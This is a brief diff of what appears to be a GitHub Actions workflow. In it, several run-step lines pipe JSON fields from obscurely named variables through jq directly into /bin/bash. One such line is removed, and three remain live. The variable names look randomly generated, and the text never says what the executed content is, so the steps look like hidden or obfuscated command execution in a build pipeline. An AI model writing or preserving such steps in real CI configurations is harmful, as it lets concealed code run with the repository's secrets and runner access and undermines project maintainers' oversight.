@@ -27,7 +27,6 @@ jobs:
           echo $bpwej2 | jq -r .zd29876 | /bin/bash
           printf '%s' "$ljh3" | jq -r .ini14 | /bin/bash
           echo $ccr0 | jq -r .r72804 | /bin/bash
-          echo $vwms8675 | jq -r .lc92 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
